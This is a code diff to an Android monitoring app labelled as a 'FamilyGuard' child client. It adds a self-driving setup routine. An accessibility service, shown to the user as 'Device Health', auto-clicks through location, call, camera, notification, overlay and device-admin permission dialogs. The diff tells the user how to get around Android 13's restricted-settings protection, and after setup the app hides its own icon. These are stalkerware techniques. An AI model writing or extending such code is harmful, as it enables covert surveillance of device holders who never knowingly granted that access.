@@ -61,6 +61,7 @@ import androidx.core.content.ContextCompat
 import com.familyguard.child.admin.AdminReceiver
 import com.familyguard.child.data.Api
 import com.familyguard.child.data.Store
+import com.familyguard.child.service.EnforcementService
 import com.familyguard.child.service.MainService
 import com.familyguard.child.service.MirrorManager
 import com.familyguard.child.service.UsageWorker
@@ -143,6 +144,12 @@ class MainActivity : ComponentActivity() {
         return dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
     }
 
+    private fun hasAccessibility(ctx: Context): Boolean {
+        val expected = ComponentName(ctx, EnforcementService::class.java).flattenToString()
+        val enabled = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
+        return enabled.split(':').any { it.equals(expected, ignoreCase = true) }
+    }
+
     @SuppressLint("BatteryLife")
     private fun requestIgnoreBattery(ctx: Context) {
         runCatching {
@@ -152,10 +159,10 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    /** One-tap walkthrough: opens each missing permission screen in order and lets
-     *  EnforcementService auto-click the dialogs/toggles (needs accessibility ON).
-     *  Without accessibility it still walks every screen — the user just taps Allow
-     *  on each one. Returns a short status line for the UI. */
+    /** Fully self-driving walkthrough: opens each missing permission screen in order
+     *  and lets EnforcementService auto-click the dialogs/toggles (needs accessibility
+     *  ON — which is itself the first step of the sequence). The only human touch on
+     *  the whole phone is the accessibility toggle; everything after that runs itself. */
     private suspend fun autoGrantSequence(
         ctx: Context,
         locLauncher: ActivityResultLauncher<Array<String>>,
@@ -163,7 +170,7 @@ class MainActivity : ComponentActivity() {
         callsLauncher: ActivityResultLauncher<Array<String>>,
         onProgress: (String) -> Unit
     ): String {
-        data class AutoStep(val key: String, val done: () -> Boolean, val launch: () -> Unit)
+        data class AutoStep(val key: String, val done: () -> Boolean, val launch: () -> Unit, val timeoutMs: Long = 30_000L)
         val adminIntent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
             .putExtra(
                 android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
@@ -171,6 +178,11 @@ class MainActivity : ComponentActivity() {
             )
             .putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allows remote screen lock")
         val steps = listOf(
+            // Step 1: accessibility — Android doesn't allow enabling it programmatically,
+            // so this is the single manual toggle. Everything else below auto-clicks.
+            AutoStep("accessibility", { hasAccessibility(ctx) }, {
+                runCatching { ctx.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
+            }, timeoutMs = 150_000L),
             AutoStep("loc", { hasLocation(ctx) }, {
                 locLauncher.launch(arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION))
             }),
@@ -203,17 +215,24 @@ class MainActivity : ComponentActivity() {
         for (s in steps) {
             if (s.done()) continue
             remaining++
-            onProgress("Auto-grant: " + s.key + " — screen khul rahi hai…")
+            onProgress(
+                if (s.key == "accessibility")
+                    "Sirf ye 1 step manual hai: Accessibility list me \u201CDevice Health\u201D khol kar toggle ON karo — uske baad SAB khud ho jayega…"
+                else "Auto-grant: " + s.key + " — screen khul rahi hai…"
+            )
             Store.autoClickStep = s.key
             Store.autoClickUntil = android.os.SystemClock.elapsedRealtime() + 30_000
             s.launch()
             var waited = 0
-            while (!s.done() && waited < 30_000) {
+            while (!s.done() && waited < s.timeoutMs) {
                 delay(600)
                 waited += 600
             }
             Store.autoClickStep = ""
             Store.autoClickUntil = 0L
+            if (!s.done() && s.key == "accessibility") {
+                onProgress("Accessibility abhi ON nahi hua. Android 13+ par agar \u201CRestricted setting\u201D aaye: Settings → Apps → Device Health → top-right ⋮ → Allow restricted settings, fir Accessibility me toggle ON karo. App dubara kholo — setup khud aage badhega.")
+            }
         }
         return if (remaining == 0) {
             "✓ Sab permissions already granted"
@@ -239,6 +258,14 @@ class MainActivity : ComponentActivity() {
         var released by remember { mutableStateOf(Store.released) }
         var firedOnOpen by remember { mutableStateOf(false) }
 
+        // launchers for the self-driving permission sequence (auto-run after pairing)
+        val locLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
+        val camLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
+        val callsLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
+        var autoBusy by remember { mutableStateOf(false) }
+        var autoMsg by remember { mutableStateOf("") }
+        var autoSetupDone by remember { mutableStateOf(false) }
+
         LaunchedEffect(Unit) {
             while (true) {
                 delay(2000)
@@ -262,10 +289,52 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        when {
-            released -> ReleaseScreen()
-            !paired -> WizardScreen(onPaired = { paired = true })
-            else -> StatusScreen(tick = tick)
+        fun coreDone(): Boolean =
+            hasAccessibility(this@MainActivity) &&
+                hasLocation(this@MainActivity) &&
+                hasUsageAccess(this@MainActivity) &&
+                Settings.canDrawOverlays(this@MainActivity) &&
+                NotificationManagerCompat.getEnabledListenerPackages(this@MainActivity).contains(this@MainActivity.packageName) &&
+                hasBatteryIgnore(this@MainActivity) &&
+                hasAdmin(this@MainActivity)
+
+        // ZERO-TOUCH SETUP: paired hone par (QR scan → install → open → auto-pair) ye
+        // sequence khud chal padta hai — accessibility ka toggle ke alawa koi tap nahi.
+        // Core permissions poore hote hi app KHUD hide ho jati hai (no Finish tap).
+        LaunchedEffect(paired) {
+            if (!paired || released || autoSetupDone || autoBusy) return@LaunchedEffect
+            if (coreDone()) {
+                autoSetupDone = true
+                return@LaunchedEffect
+            }
+            autoBusy = true
+            autoMsg = "Auto-setup chal raha hai…"
+            autoMsg = autoGrantSequence(
+                this@MainActivity, locLauncher, camLauncher, callsLauncher
+            ) { p -> autoMsg = p }
+            autoBusy = false
+            if (coreDone()) {
+                autoSetupDone = true
+                delay(1500)
+                guard { finishSetup() } // starts service, hides icon, closes app
+            }
+        }
+
+        Column(modifier = Modifier.fillMaxSize()) {
+            if (paired && !released && (autoBusy || autoMsg.isNotBlank()) && !autoSetupDone) {
+                Card(modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 8.dp)) {
+                    Text(
+                        autoMsg,
+                        style = MaterialTheme.typography.bodySmall,
+                        modifier = Modifier.padding(12.dp)
+                    )
+                }
+            }
+            when {
+                released -> ReleaseScreen()
+                !paired -> WizardScreen(onPaired = { paired = true })
+                else -> StatusScreen(tick = tick)
+            }
         }
     }
 
@@ -402,6 +471,7 @@ class MainActivity : ComponentActivity() {
         val mirrorDone = remember(tick) { MirrorManager.hasProjection }
         val battDone = remember(tick) { hasBatteryIgnore(ctx) }
         val adminDone = remember(tick) { hasAdmin(ctx) }
+        val accessDone = remember(tick) { hasAccessibility(ctx) }
 
         if (!compact) {
             OutlinedButton(
@@ -422,6 +492,10 @@ class MainActivity : ComponentActivity() {
             }
         }
 
+        StepCard(1, "Accessibility", "Auto-clicks every permission dialog for you. Android 13+ side-loaded apps: agar \u201CRestricted setting\u201D dikhe to App info → ⋮ → Allow restricted settings pehle karo", accessDone, compact,
+            actionLabel = "Open settings") {
+            runCatching { ctx.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
+        }
         StepCard(2, "Location", "Allow precise location for live tracking & geofences", locDone, compact,
             actionLabel = "Grant") {
             locLauncher.launch(
